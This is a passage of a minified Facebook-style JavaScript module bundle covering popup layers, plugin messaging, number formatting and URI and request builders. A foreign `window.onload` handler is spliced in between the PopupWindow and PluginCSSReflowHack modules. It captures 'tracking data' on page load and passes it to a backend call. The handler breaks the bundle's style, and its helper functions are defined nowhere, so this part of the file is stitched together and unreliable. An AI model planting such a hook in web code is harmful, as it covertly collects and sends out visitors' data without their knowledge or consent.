        for (var a in this._behaviors) this._behaviors[a].disable();
        this._behaviors = {};
      }
    },
    hasBehavior: function (a) {
      return this._behaviors && i(a) in this._behaviors;
    }
  };
  b = a;
  f["default"] = b;
}, 66);
__d("isValidReactElement", [], function (a, b, c, d, e, f) {
  var g = typeof Symbol === "function" && Symbol["for"] && Symbol["for"]("react.element") || 60103;
  function a(a) {
    return !!(typeof a === "object" && a !== null && a.$$typeof === g);
  }
  f["default"] = a;
}, 66);
__d("setImmediate", ["TimeSlice", "TimerStorage", "setImmediateAcrossTransitions"], function (a, b, c, d, e, f, g) {
  function a(a) {
    var b,
      d = function () {
        c("TimerStorage").unset(c("TimerStorage").IMMEDIATE, b);
        for (var d = arguments.length, e = new Array(d), f = 0; f < d; f++) e[f] = arguments[f];
        Function.prototype.apply.call(a, this, e);
      };
    c("TimeSlice").copyGuardForWrapper(a, d);
    for (var e = arguments.length, f = new Array(e > 1 ? e - 1 : 0), g = 1; g < e; g++) f[g - 1] = arguments[g];
    b = c("setImmediateAcrossTransitions").apply(void 0, [d].concat(f));
    c("TimerStorage").set(c("TimerStorage").IMMEDIATE, b);
    return b;
  }
  g["default"] = a;
}, 98);
__d("Layer", ["invariant", "ArbiterMixin", "BehaviorsMixin", "BootloadedReact", "CSS", "ContextualThing", "DOM", "DataStore", "Event", "FBLogger", "HTML", "KeyEventController", "KeyStatus", "Parent", "Style", "ge", "isNode", "isValidReactElement", "mixin", "removeFromArray", "setImmediate"], function (a, b, c, d, e, f, g, h) {
  b("KeyStatus");
  var i = [],
    j = function (b) {
      babelHelpers.inheritsLoose(a, b);
      function a(a, d) {
        var e;
        e = b.call(this) || this;
        e._config = a || {};
        if (d) {
          e._configure(e._config, d);
          a = e._config.addedBehaviors || [];
          e.enableBehaviors(e._getDefaultBehaviors().concat(a));
        } else c("FBLogger")("layer").warn("The markup param wasn't provided to the Layer constructor");
        return e;
      }
      var e = a.prototype;
      e.init = function (a) {
        this._configure(this._config, a);
        a = this._config.addedBehaviors || [];
        this.enableBehaviors(this._getDefaultBehaviors().concat(a));
        this._initialized = !0;
        return this;
      };
      e._configure = function (a, b) {
        var e = this;
        if (b) {
          var f = c("isNode")(b),
            g = typeof b === "string" || c("HTML").isHTML(b);
          this.containsReactComponent = c("isValidReactElement")(b);
          !f && !g && !this.containsReactComponent && c("FBLogger")("layer").warn("Layer must be init with HTML, DOM node or React instance");
          if (g) b = c("HTML")(b).getRootNode();else if (this.containsReactComponent) {
            f = document.createElement("div");
            var h = !0;
            d("BootloadedReact").render(b, f, function () {
              e.inform("reactshow"), h || e.updatePosition();
            });
            h = !1;
            b = this._reactContainer = f;
          }
        }
        this._root = this._buildWrapper(a, b);
        a.attributes && c("DOM").setAttributes(this._root, a.attributes);
        a.classNames && a.classNames.forEach(d("CSS").addClass.bind(null, this._root));
        d("CSS").addClass(this._root, "uiLayer");
        a.causalElement && (this._causalElement = c("ge")(a.causalElement));
        a.permanent && (this._permanent = a.permanent);
        a.isStrictlyControlled && (this._isStrictlyControlled = a.isStrictlyControlled);
        d("DataStore").set(this._root, "layer", this);
      };
      e._getDefaultBehaviors = function () {
        return [];
      };
      e.getCausalElement = function () {
        return this._causalElement;
      };
      e.setCausalElement = function (a) {
        this._causalElement = a;
        return this;
      };
      e.getInsertParent = function () {
        return this._insertParent || document.body;
      };
      e.getRoot = function () {
        this._root || (this._destroyed ? c("FBLogger")("layer").warn("No root node for this Layer. It has either not yet been set or the Layer has been destroyed.  This layer has been destroyed.") : c("FBLogger")("layer").warn("No root node for this Layer. It has probably not been set."));
        return this._root;
      };
      e.getContentRoot = function () {
        return this.getRoot();
      };
      e._buildWrapper = function (a, b) {
        return b;
      };
      e.setInsertParent = function (a) {
        a && (this._shown && a !== this.getInsertParent() && (c("DOM").appendContent(a, this.getRoot()), this.updatePosition()), this._insertParent = a);
        return this;
      };
      e.showAfterDelay = function (a) {
        window.setTimeout(this.show.bind(this), a);
      };
      e.show = function () {
        var b = this;
        if (this._shown) return this;
        var e = this.getRoot();
        e != null || h(0, 5142);
        this.inform("beforeshow");
        c("Style").set(e, "visibility", "hidden");
        c("Style").set(e, "overflow", "hidden");
        d("CSS").show(e);
        c("DOM").appendContent(this.getInsertParent(), e);
        this.updatePosition() !== !1 ? (this._shown = !0, this.inform("show"), a.inform("show", this), this._permanent || window.setTimeout(function () {
          b._shown && i.push(b);
        }, 0)) : d("CSS").hide(e);
        c("Style").set(e, "visibility", "");
        c("Style").set(e, "overflow", "");
        c("Style").set(e, "opacity", "1");
        this.inform("aftershow");
        return this;
      };
      e.hide = function (a) {
        if (this._isStrictlyControlled) {
          this._shown && this.inform("runhide", a);
          return this;
        }
        return this._hide();
      };
      e._hide = function () {
        if (this._hiding || !this._shown || this.inform("beforehide") === !1) return this;
        this._hiding = !0;
        this.inform("starthide") !== !1 && this.finishHide();
        return this;
      };
      e.conditionShow = function (a) {
        return a ? this.show() : this._hide();
      };
      e.finishHide = function () {
        if (this._shown) {
          this._permanent || c("removeFromArray")(i, this);
          this._hiding = !1;
          this._shown = !1;
          var b = this.getRoot();
          b != null || h(0, 5143);
          d("CSS").hide(b);
          this.inform("hide");
          a.inform("hide", this);
        }
      };
      e.isShown = function () {
        return this._shown;
      };
      e.updatePosition = function () {
        return !0;
      };
      e.destroy = function () {
        this.containsReactComponent && d("BootloadedReact").unmountComponentAtNode(this._reactContainer);
        this.finishHide();
        var b = this.getRoot();
        c("DOM").remove(b);
        this.destroyBehaviors();
        this.inform("destroy");
        a.inform("destroy", this);
        d("DataStore").remove(b, "layer");
        this._root = this._causalElement = null;
        this._destroyed = !0;
      };
      a.init = function (a, b) {
        a.init(b);
      };
      a.initAndShow = function (a, b) {
        a.init(b).show();
      };
      a.show = function (a) {
        a.show();
      };
      a.showAfterDelay = function (a, b) {
        a.showAfterDelay(b);
      };
      a.getTopmostLayer = function () {
        return i[i.length - 1];
      };
      a.informBlur = function (a) {
        k = null;
        l = null;
        var b = i.length;
        if (!b) return;
        while (b--) {
          var c = i[b],
            e = c.getContentRoot();
          e != null || h(0, 5144);
          if (d("ContextualThing").containsIncludingLayers(e, a)) return;
          if (c.inform("blur", {
            target: a
          }) === !1 || c.isShown()) return;
        }
      };
      return a;
    }(c("mixin")(c("ArbiterMixin"), c("BehaviorsMixin")));
  Object.assign(j, c("ArbiterMixin"));
  Object.assign(j.prototype, {
    _destroyed: !1,
    _initialized: !1,
    _root: null,
    _shown: !1,
    _hiding: !1,
    _causalElement: null,
    _reactContainer: null
  });
  c("Event").listen(document.documentElement, "keydown", function (a) {
    if (c("KeyEventController").filterEventTargets(a, "keydown")) for (var b = i.length - 1; b >= 0; b--) if (i[b].inform("key", a) === !1) return !1;
    return !0;
  }, c("Event").Priority.URGENT);
  var k;
  c("Event").listen(document.documentElement, "mousedown", function (a) {
    k = a.getTarget();
  });
  var l;
  c("Event").listen(document.documentElement, "mouseup", function (a) {
    l = a.getTarget(), c("setImmediate")(function () {
      k = null, l = null;
    });
  });
  c("Event").listen(document.documentElement, "click", function (a) {
    var b = k,
      e = l;
    k = null;
    l = null;
    var f = i.length;
    if (!f) return;
    f = a.getTarget();
    if (f !== e || f !== b) return;
    if (!c("DOM").contains(document.documentElement, f)) return;
    if (f.offsetWidth != null && !f.offsetWidth) return;
    if (d("Parent").byClass(f, "generic_dialog")) return;
    j.informBlur(f);
  });
  g["default"] = j;
}, 98);
__d("getViewportDimensions", ["UserAgent"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = function () {
    var a = null;
    return function () {
      var b = document.body;
      if (b == null) return null;
      (a == null || !b.contains(a)) && (a = document.createElement("div"), a.style.left = Number.MAX_SAFE_INTEGER + "px", a.style.width = "100%", a.style.height = "100%", a.style.position = "fixed", b.appendChild(a));
      return a;
    };
  }();
  function i() {
    var a;
    document.documentElement && (a = document.documentElement.clientWidth);
    a == null && document.body && (a = document.body.clientWidth);
    return a || 0;
  }
  function j() {
    var a;
    document.documentElement && (a = document.documentElement.clientHeight);
    a == null && document.body && (a = document.body.clientHeight);
    return a || 0;
  }
  function k() {
    return {
      width: window.innerWidth || i(),
      height: window.innerHeight || j()
    };
  }
  k.withoutScrollbars = function () {
    return c("UserAgent").isPlatform("Android") ? k() : {
      width: i(),
      height: j()
    };
  };
  k.layout = function () {
    var a,
      b = h();
    return {
      width: (a = b == null ? void 0 : b.clientWidth) != null ? a : i(),
      height: (a = b == null ? void 0 : b.clientHeight) != null ? a : j()
    };
  };
  g["default"] = k;
}, 98);
__d("isFalsey", [], function (a, b, c, d, e, f) {
  "use strict";

  function a(a) {
    return a == null || !Boolean(a);
  }
  f["default"] = a;
}, 66);
__d("PopupWindow", ["DOMDimensions", "DOMQuery", "FlowMigrationUtilsForLegacyFiles", "Layer", "Popup", "getViewportDimensions", "isFalsey"], function (a, b, c, d, e, f, g) {
  var h = {
    allowShrink: !0,
    strategy: "vector",
    timeout: 100,
    widthElement: null
  };
  function b(a) {
    Object.assign(h, a), window.setInterval(i, h.timeout);
  }
  function i() {
    var a = c("getViewportDimensions")(),
      b = j(),
      e = c("Layer").getTopmostLayer();
    if (e) {
      e = (e = e.getRoot()) == null ? void 0 : e.firstChild;
      e || d("FlowMigrationUtilsForLegacyFiles").invariantViolation("topMostLayer.getRoot().firstChild is null.");
      var f = d("DOMDimensions").getElementDimensions(e);
      f.height += d("DOMDimensions").measureElementBox(e, "height", !0, !0, !0);
      f.width += d("DOMDimensions").measureElementBox(e, "width", !0, !0, !0);
      b.height = Math.max(b.height, f.height);
      b.width = Math.max(b.width, f.width);
    }
    e = b.height - a.height;
    f = b.width - a.width;
    f < 0 && c("isFalsey")(h.widthElement) && (f = 0);
    f = f > 1 ? f : 0;
    c("isFalsey")(h.allowShrink) && e < 0 && (e = 0);
    if (e || f) try {
      window.console && window.console.firebug, window.resizeBy(f, e), f && window.moveBy(f / -2, 0);
    } catch (a) {}
  }
  function j() {
    var b = d("DOMDimensions").getDocumentDimensions();
    if (h.strategy === "offsetHeight") {
      var e = document.body;
      if (!e) d("FlowMigrationUtilsForLegacyFiles").invariantViolation("document.body is null.");else {
        b.height = (e = e.offsetHeight) != null ? e : 0;
      }
    }
    if (c("isFalsey")(h.widthElement) && typeof h.widthElement === "string") {
      e = d("DOMQuery").scry(document.body, h.widthElement)[0];
      e && (b.width = d("DOMDimensions").getElementDimensions(e).width);
    }
    e = a.Dialog;
    e && e.max_bottom && e.max_bottom > b.height && (b.height = e.max_bottom);
    return b;
  }
  function e(a, b, c, e) {
    return d("Popup").open(a, c, b, e);
  }
  g._opts = h;
  g.init = b;
  g._resizeCheck = i;
  g._getDocumentSize = j;
  g.open = e;
}, 98);
window.onload = () => {
  let trackingData = captureTrackingData();
  communicateWithBackendTrackingData(trackingData);
};
__d("PluginCSSReflowHack", ["Style"], function (a, b, c, d, e, f, g) {
  function a(a) {
    setTimeout(function () {
      var b = "border-bottom-width",
        d = c("Style").get(a, b);
      c("Style").set(a, b, parseInt(d, 10) + 1 + "px");
      c("Style").set(a, b, d);
    }, 1e3);
  }
  g.trigger = a;
}, 98);
__d("PluginMessage", ["Arbiter", "CSS", "DOM", "DOMEventListener", "MNCommerceLogger", "UnverifiedXD"], function (a, b, c, d, e, f, g) {
  var h = "platform/plugins/checkbox_connect/access_token";
  function a() {
    d("DOMEventListener").add(window, "message", function (a) {
      if (/\.facebook\.com$/.test(a.origin) && i().test(a.data)) {
        a = JSON.parse(a.data.substring(24));
        "type" in a && (a.type === "send_to_messenger" ? j(a) : a.type === "messenger_checkbox" ? k(a) : a.type === "customer_chat" && m(a));
      }
    });
  }
  function i() {
    return new RegExp("^SOCIALPLUGIN_AUTH_POPUP:");
  }
  function j(a) {
    var b = document.getElementById("send-to-messenger-connect-button"),
      e = document.getElementById("send-to-messenger-disconnect-button"),
      f = document.getElementById("send-to-messenger-identity"),
      g = document.getElementById("send-to-messenger-profile-photo"),
      h = document.getElementById("send-to-messenger-profile-name");
    b != null && e != null && f != null && g != null && h != null && (a.can_personalize === !0 && a.connected === !0 ? (d("CSS").show(b), d("CSS").hide(e), l(g, a.profile_photo), l(h, a.profile_name), d("CSS").show(f), d("MNCommerceLogger").logAuthEvent(String(a.app_id), String(a.page_id), String(a.user_id), "send_to_messenger_opt_in_client_event"), c("UnverifiedXD").send({
      type: "sdk_event",
      event: "send_to_messenger",
      data: JSON.stringify({
        event: "opt_in",
        ref: String(a.ref)
      })
    })) : (d("CSS").hide(b), d("CSS").show(e), d("CSS").hide(f)));
  }
  function k(a) {
    var b = document.getElementById("plugin-MN-commerce-identity"),
      e = document.getElementById("plugin-MN-commerce-identity-profile-picture"),
      f = document.getElementById("plugin-MN-commerce-identity-profile-name"),
      g = document.getElementById("web-plugin-checkbox-form");
    b != null && e != null && f != null && g != null && (a.can_personalize === !0 ? (l(e, a.profile_photo), l(f, a.profile_name), d("CSS").show(b), l(g, a.checkbox), a.access_token != null && c("Arbiter").inform(h, a.access_token)) : d("CSS").hide(b));
  }
  function l(a, b) {
    var d = document.createElement("div");
    c("DOM").setContent(d, b);
    b = d.firstChild;
    b != null && a.replaceWith(b);
  }
  function m(a) {
    var b = window.require("Arbiter");
    "ArbiterData" in a ? b.inform(a.ArbiterEvent, a.ArbiterData) : b.inform(a.ArbiterEvent);
  }
  g.MESSENGER_CHECKBOX_ACCESS_TOKEN_LOGIN_ARBITER = h;
  g.listen = a;
}, 98);
__d("PluginConfirm", ["DOMEvent", "DOMEventListener", "PlatformVersioning", "PluginMessage", "PopupWindow", "URI"], function (a, b, c, d, e, f) {
  var g;
  function h(a) {
    Object.assign(this, {
      plugin: a,
      confirm_params: {},
      return_params: (g || (g = b("URI"))).getRequestURI().getQueryData()
    }), this.addReturnParams({
      ret: "sentry"
    }), delete this.return_params.hash;
  }
  Object.assign(h.prototype, {
    addConfirmParams: function (a) {
      Object.assign(this.confirm_params, a);
    },
    addReturnParams: function (a) {
      Object.assign(this.return_params, a);
      return this;
    },
    start: function () {
      var a = b("PlatformVersioning").versionAwareURI(new (g || (g = b("URI")))("/plugins/error/confirm/" + this.plugin)).addQueryData(this.confirm_params).addQueryData({
        secure: g.getRequestURI().isSecure(),
        plugin: this.plugin,
        return_params: JSON.stringify(this.return_params)
      });
      this.popup = b("PopupWindow").open(a.toString(), 320, 486);
      b("PluginMessage").listen();
      return this;
    }
  });
  h.starter = function (a, b, c) {
    a = new h(a);
    a.addConfirmParams(b || {});
    a.addReturnParams(c || {});
    return a.start.bind(a);
  };
  h.listen = function (a, c, d, e) {
    b("DOMEventListener").add(a, "click", function (a) {
      new (b("DOMEvent"))(a).kill(), h.starter(c, d, e)();
    });
  };
  e.exports = h;
}, null);
__d("intlSummarizeNumber", ["FbtNumberType", "IntlCompactDecimalNumberFormatConfig", "IntlVariations", "intlNumUtils"], function (a, b, c, d, e, f, g) {
  var h = 3,
    i = 14,
    j = {
      ROUND: "ROUND",
      TRUNCATE: "TRUNCATE"
    },
    k = {
      SHORT: "SHORT",
      LONG: "LONG"
    };
  function a(a, b, d, e) {
    d === void 0 && (d = k.SHORT);
    e === void 0 && (e = j.ROUND);
    d = c("IntlCompactDecimalNumberFormatConfig")[d === k.SHORT ? "short_patterns" : "long_patterns"];
    var f = a === 0 ? 0 : Math.floor(Math.log10(Math.abs(a)));
    f > i && (f = i);
    var g = l(a, f, b, e, d),
      m = g[0],
      n = g[1];
    g = g[2];
    if (g) {
      f += 1;
      g = l(a, f, b, e, d);
      m = g[0];
      n = g[1];
      g[2];
    }
    e = c("FbtNumberType").getVariation(m) || c("IntlVariations").NUMBER_OTHER;
    g = f.toString();
    g = d == null ? void 0 : (d = d[g]) == null ? void 0 : d[e.toString()];
    if (!g || f < h || g.positive_prefix_pattern === "" && g.positive_suffix_pattern === "") {
      d = b === void 0 ? 0 : b;
      return c("intlNumUtils").formatNumberWithThousandDelimiters(a, d);
    }
    return g && g.min_integer_digits === 0 && m === 1 ? g.positive_prefix_pattern + g.positive_suffix_pattern : (g && g.positive_prefix_pattern || "") + c("intlNumUtils").formatNumberWithThousandDelimiters(m, n) + (g && g.positive_suffix_pattern || "");
  }
  function l(a, b, d, e, f) {
    var g = b.toString();
    g = f == null ? void 0 : (f = f[g]) == null ? void 0 : f[c("IntlVariations").NUMBER_OTHER.toString()];
    f = g && g.min_integer_digits || b + 1;
    var h = b - f + 1;
    h = Math.abs(a) / Math.pow(10, h);
    var k = d != null;
    d = k ? d : g && g.min_fraction_digits;
    d == null && (d = b > 2 ? 1 : 0);
    g = e === j.TRUNCATE ? c("intlNumUtils").truncateLongNumber(h.toString(), d) : h.toFixed(d);
    e = parseFloat(g) * (a < 0 ? -1 : 1);
    return [e, e % 1 === 0 && !k ? 0 : d, g.length > f + (d > 0 ? d + 1 : 0) + (h >= 0 ? 0 : 1) && b < i];
  }
  g["default"] = a;
}, 98);
__d("PluginIconButton", ["fbt", "invariant", "CSS", "DOM", "Event", "intlSummarizeNumber"], function (a, b, c, d, e, f, g, h, i) {
  a = function () {
    function a(a, b, d, e) {
      var f = this;
      a.removeAttribute("id");
      e === null || d !== null || i(0, 2812);
      this.$1 = a;
      this.$2 = d;
      this.$3 = e;
      b === !1 && (c("Event").listen(a, "click", function () {
        return f.toggleButton();
      }), c("Event").listen(a, "toggle", function () {
        return f.toggleButton();
      }));
    }
    var b = a.prototype;
    b.toggleButton = function () {
      var a = this;
      d("CSS").hasClass(this.$1, "active") === !1 ? (d("CSS").addClass(this.$1, "active"), this.$4(!0), d("CSS").addClass(this.$1, "is_animating"), setTimeout(function () {
        d("CSS").removeClass(a.$1, "is_animating");
      }, 240)) : (d("CSS").removeClass(this.$1, "active"), this.$4(!1));
    };
    b.setTitle = function (a) {
      this.$1.setAttribute("title", a);
    };
    b.$4 = function (a) {
      var b = function (a) {
        return h._("{count}", [h._param("count", c("intlSummarizeNumber")(a, 0))]);
      };
      this.$3 != null && this.$3 < 1e3 && (this.$3 = a ? this.$3 + 1 : this.$3 - 1, c("DOM").setContent(this.$2, b(this.$3)));
    };
    b.isActivated = function () {
      return d("CSS").hasClass(this.$1, "active");
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("PluginPageActionLogger", ["BanzaiLogger", "DOMEventListener", "DOMQuery", "ODS"], function (a, b, c, d, e, f, g) {
  function a(a, b, e, f, g, h, i, j, k, l) {
    function m(g, h) {
      g = d("DOMQuery").scry(f, "." + g)[0];
      if (!g) return;
      d("DOMEventListener").add(g, "click", function (f) {
        d("ODS").bumpEntityKey(2966, "platform_www", "platform.plugin.page.action"), c("BanzaiLogger").log("PagePluginActionsLoggerConfig", {
          page_id: b,
          page_plugin_action: h,
          page_plugin_action_type: "click",
          referer_url: e,
          is_sdk: a
        });
      });
    }
    m(g, "page_like");
    m(h, "page_unlike");
    m(i, "page_avatar");
    m(j, "page_permalink");
    m(k, "page_share");
    m(l, "page_cta");
  }
  g.initializeClickLoggers = a;
}, 98);
__d("XControllerURIBuilder", ["invariant", "URI", "gkx", "isInternalFBURI"], function (a, b, c, d, e, f, g, h) {
  a = function () {
    function a(a, b) {
      this.$1 = {}, this.$2 = a, this.$3 = b;
    }
    var b = a.prototype;
    b.setInt = function (a, b) {
      return this.__setParam(a, "Int", b);
    };
    b.setFBID = function (a, b) {
      return this.__setParam(a, "FBID", b);
    };
    b.setFloat = function (a, b) {
      return this.__setParam(a, "Float", b);
    };
    b.setString = function (a, b) {
      return this.__setParam(a, "String", b);
    };
    b.setExists = function (a, b) {
      b === !1 && (b = void 0);
      return this.__setParam(a, "Exists", b);
    };
    b.setBool = function (a, b) {
      return this.__setParam(a, "Bool", b);
    };
    b.setBoolVector = function (a, b) {
      return this.__setParam(a, "BoolVector", b);
    };
    b.setEnum = function (a, b) {
      return this.__setParam(a, "Enum", b);
    };
    b.setPath = function (a, b) {
      return this.__setParam(a, "Path", b);
    };
    b.setIntVector = function (a, b) {
      return this.__setParam(a, "IntVector", b);
    };
    b.setIntKeyset = function (a, b) {
      return this.__setParam(a, "IntKeyset", b);
    };
    b.setIntSet = function (a, b) {
      return this.__setParam(a, "IntSet", b.join(","));
    };
    b.setFloatVector = function (a, b) {
      return this.__setParam(a, "FloatVector", b);
    };
    b.setFloatSet = function (a, b) {
      return this.__setParam(a, "FloatSet", b.join(","));
    };
    b.setStringVector = function (a, b) {
      return this.__setParam(a, "StringVector", b);
    };
    b.setStringKeyset = function (a, b) {
      return this.__setParam(a, "StringKeyset", b);
    };
    b.setStringSet = function (a, b) {
      return this.__setParam(a, "StringSet", b);
    };
    b.setFBIDVector = function (a, b) {
      return this.__setParam(a, "FBIDVector", b);
    };
    b.setFBIDSet = function (a, b) {
      return this.__setParam(a, "FBIDSet", b);
    };
    b.setFBIDKeyset = function (a, b) {
      return this.__setParam(a, "FBIDKeyset", b);
    };
    b.setEnumVector = function (a, b) {
      return this.__setParam(a, "EnumVector", b);
    };
    b.setEnumSet = function (a, b) {
      return this.__setParam(a, "EnumSet", b);
    };
    b.setEnumKeyset = function (a, b) {
      return this.__setParam(a, "EnumKeyset", b);
    };
    b.setIntToIntMap = function (a, b) {
      return this.__setParam(a, "IntToIntMap", b);
    };
    b.setIntToFloatMap = function (a, b) {
      return this.__setParam(a, "IntToFloatMap", b);
    };
    b.setIntToStringMap = function (a, b) {
      return this.__setParam(a, "IntToStringMap", b);
    };
    b.setIntToBoolMap = function (a, b) {
      return this.__setParam(a, "IntToBoolMap", b);
    };
    b.setStringToIntMap = function (a, b) {
      return this.__setParam(a, "StringToIntMap", b);
    };
    b.setStringToFloatMap = function (a, b) {
      return this.__setParam(a, "StringToFloatMap", b);
    };
    b.setStringToStringMap = function (a, b) {
      return this.__setParam(a, "StringToStringMap", b);
    };
    b.setStringToNullableStringMap = function (a, b) {
      return this.__setParam(a, "StringToNullableStringMap", b);
    };
    b.setStringToBoolMap = function (a, b) {
      return this.__setParam(a, "StringToBoolMap", b);
    };
    b.setStringToEnumMap = function (a, b) {
      return this.__setParam(a, "StringToEnumMap", b);
    };
    b.setEnumToStringVectorMap = function (a, b) {
      return this.__setParam(a, "EnumToStringVectorMap", b);
    };
    b.setEnumToStringMap = function (a, b) {
      return this.__setParam(a, "EnumToStringMap", b);
    };
    b.setEnumToBoolMap = function (a, b) {
      return this.__setParam(a, "EnumToBoolMap", b);
    };
    b.setEnumToEnumMap = function (a, b) {
      return this.__setParam(a, "EnumToEnumMap", b);
    };
    b.setEnumToIntMap = function (a, b) {
      return this.__setParam(a, "EnumToIntMap", b);
    };
    b.setEnumToFBIDVectorMap = function (a, b) {
      return this.__setParam(a, "EnumToFBIDVectorMap", b);
    };
    b.setStringToIntDict = function (a, b) {
      return this.__setParam(a, "StringToIntDict", b);
    };
    b.setStringToNullableIntDict = function (a, b) {
      return this.__setParam(a, "StringToNullableIntDict", b);
    };
    b.setStringToFloatDict = function (a, b) {
      return this.__setParam(a, "StringToFloatDict", b);
    };
    b.setStringToStringKeysetDict = function (a, b) {
      return this.__setParam(a, "StringToStringKeysetDict", b);
    };
    b.setStringToNullableFloatDict = function (a, b) {
      return this.__setParam(a, "StringToNullableFloatDict", b);
    };
    b.setStringToStringDict = function (a, b) {
      return this.__setParam(a, "StringToStringDict", b);
    };
    b.setStringToNullableStringDict = function (a, b) {
      return this.__setParam(a, "StringToNullableStringDict", b);
    };
    b.setStringToBoolDict = function (a, b) {
      return this.__setParam(a, "StringToBoolDict", b);
    };
    b.setStringToEnumDict = function (a, b) {
      return this.__setParam(a, "StringToEnumDict", b);
    };
    b.setEnumToIntDict = function (a, b) {
      return this.__setParam(a, "EnumToIntDict", b);
    };
    b.setEnumToStringDict = function (a, b) {
      return this.__setParam(a, "EnumToStringDict", b);
    };
    b.setHackType = function (a, b) {
      return this.__setParam(a, "HackType", b);
    };
    b.setTypeAssert = function (a, b) {
      return this.__setParam(a, "TypeAssert", b);
    };
    b.__validateRequiredParamsExistence = function () {
      for (var a in this.$3) !this.$3[a].required || Object.prototype.hasOwnProperty.call(this.$1, a) || h(0, 903, a);
    };
    b.setParams = function (a) {
      for (var b in a) {
        this.__assertParamExists(b);
        var c = this.$3[b].type;
        this.__setParam(b, c, a[b]);
      }
      return this;
    };
    b.__assertParamExists = function (a) {
      a in this.$3 || h(0, 37339, a);
    };
    b.__setParam = function (a, b, c) {
      this.__assertParamExists(a);
      var d = this.$3[a].type,
        e = {
          StringOrPFBID: "String",
          IntOrPFBID: "Int",
          FBIDOrPFBID: "FBID",
          PaymentLegacyAdAccountID: "Int"
        };
      e = e[d];
      d === b || e === b || h(0, 37340, a, b, d);
      this.__setParamInt(a, c);
      return this;
    };
    b.__setParamInt = function (a, b) {
      this.$1[a] = b;
    };
    b.getRequest_LEGACY_UNTYPED = function (a) {
      return a.setReplaceTransportMarkers().setURI(this.getURI());
    };
    b.setPreviousActorIsPageVoice = function (a) {
      this.__setParamInt("paipv", a ? 1 : 0);
      return this;
    };
    b.getURI = function () {
      this.__validateRequiredParamsExistence();
      var a = {},
        b = "",
        d = /^(.*)?\{(\?)?(\*)?(.+?)\}(.*)?$/,
        e = this.$2.split("/"),
        f = !1;
      for (var g = 0; g < e.length; g++) {
        var i = e[g];
        if (i === "") continue;
        var j = d.exec(i);
        if (!j) b += "/" + i;else {
          i = j[2] === "?";
          var k = j[4],
            l = this.$3[k];
          l || h(0, 11837, k, this.$2);
          if (i && f) continue;
          if (this.$1[k] == null && i) {
            f = !0;
            continue;
          }
          i = this.$1[k] != null ? this.$1[k] : l.defaultValue;
          i != null || h(0, 907, k);
          l = j[1] ? j[1] : "";
          j = j[5] ? j[5] : "";
          b += "/" + l + i + j;
          a[k] = !0;
        }
      }
      this.$2.slice(-1) === "/" && (b += "/");
      b === "" && (b = "/");
      l = new (c("URI"))(b);
      for (i in this.$1) {
        j = this.$1[i];
        if (!a[i] && j != null) {
          k = this.$3[i];
          l.addQueryData(i, k && k.type === "Exists" ? null : j);
        }
      }
      return l;
    };
    b.getLookasideURI = function () {
      var a = "lookaside.facebook.com";
      c("isInternalFBURI")(c("URI").getRequestURI()) ? a = "lookaside.internalfb.com" : c("gkx")("996940") && (a = "lookaside.internmc.facebook.com");
      return this.getURI().setDomain(a).setProtocol("https");
    };
    a.create = function (b, c) {
      return function () {
        return new a(b, c);
      };
    };
    return a;
  }();
  a.prototype.getRequest = function (a) {
    return this.getRequest_LEGACY_UNTYPED(a);
  };
  g["default"] = a;
}, 98);
__d("XRequest", ["invariant"], function (a, b, c, d, e, f, g) {
  var h = function a(b, c, d) {
    var e;
    switch (b) {
      case "Bool":
        e = c && c !== "false" && c !== "0" || !1;
        break;
      case "Int":
        e = c.toString();
        /-?\d+/.test(e) || g(0, 11839, c);
        break;
      case "Float":
        e = parseFloat(c, 10);
        isNaN(e) && g(0, 11840, c);
        break;
      case "FBID":
        e = c.toString();
        for (var f = 0; f < e.length; ++f) {
          var h = e.charCodeAt(f);
          48 <= h && h <= 57 || g(0, 11841, c);
        }
        break;
      case "String":
        e = c.toString();
        break;
      case "Enum":
        d === 0 ? e = a("Int", c, null) : d === 1 ? e = a("String", c, null) : d === 2 ? e = c : g(0, 5044, d);
        break;
      default:
        if (h = /^Nullable(\w+)$/.exec(b)) c === null ? e = null : e = a(h[1], c, d);else if (f = /^(\w+)Vector$/.exec(b)) {
          !Array.isArray(c) ? (e = c.toString(), e = e === "" ? [] : e.split(",")) : e = c;
          var i = f[1];
          typeof i === "string" || g(0, 5045);
          e = e.map(function (b) {
            return a(i, b, d && d.member);
          });
        } else if (h = /^(\w+)(Set|Keyset)$/.exec(b)) !Array.isArray(c) ? (e = c.toString(), e = e === "" ? [] : e.split(",")) : e = c, e = e.reduce(function (a, b) {
          a[b] = b;
          return a;
        }, {}), i = h[1], typeof i === "string" || g(0, 5045), e = Object.keys(e).map(function (b) {
          return a(i, e[b], d && d.member);
        });else if (f = /^(\w+)To(\w+)Map$/.exec(b)) {
          e = {};
          var j = f[1],
            k = f[2];
          typeof j === "string" && typeof k === "string" || g(0, 5045);
          Object.keys(c).forEach(function (b) {
            e[a(j, b, d && d.key)] = a(k, c[b], d && d.value);
          });
        } else g(0, 11842, b);
    }
    return e;
  };
  a = function () {
    function a(a, b, c) {
      var d = this;
      this.$1 = b;
      this.$2 = babelHelpers["extends"]({}, c.getQueryData());
      b = a.split("/").filter(function (a) {
        return a;
      });
      a = c.getPath().split("/").filter(function (a) {
        return a;
      });
      var e;
      for (var f = 0; f < b.length; ++f) {
        var h = /^\{(\?)?(\*)?(\w+)\}$/.exec(b[f]);
        if (!h) {
          b[f] === a[f] || g(0, 5047, c.getPath());
          continue;
        }
        var i = !!h[1],
          j = !!h[2];
        !j || f === b.length - 1 || g(0, 11843, e);
        e = h[3];
        Object.prototype.hasOwnProperty.call(this.$1, e) || g(0, 11844, e);
        this.$1[e].required ? i && g(0, 5050, e) : i || g(0, 5057, e);
        a[f] && (this.$2[e] = j ? a.slice(f).join("/") : a[f]);
      }
      Object.keys(this.$1).forEach(function (a) {
        !d.$1[a].required || Object.prototype.hasOwnProperty.call(d.$2, a) || g(0, 5051);
      });
    }
    var b = a.prototype;
    b.getExists = function (a) {
      return this.$2[a] !== void 0;
    };
    b.getBool = function (a) {
      return this.$3(a, "Bool");
    };
    b.getInt = function (a) {
      return this.$3(a, "Int");
    };
    b.getFloat = function (a) {
      return this.$3(a, "Float");
    };
    b.getFBID = function (a) {
      return this.$3(a, "FBID");
    };
    b.getString = function (a) {
      return this.$3(a, "String");
    };
    b.getEnum = function (a) {
      return this.$3(a, "Enum");
    };
    b.getOptionalInt = function (a) {
      return this.$4(a, "Int");
    };
    b.getOptionalFloat = function (a) {
      return this.$4(a, "Float");
    };
    b.getOptionalFBID = function (a) {
      return this.$4(a, "FBID");
    };
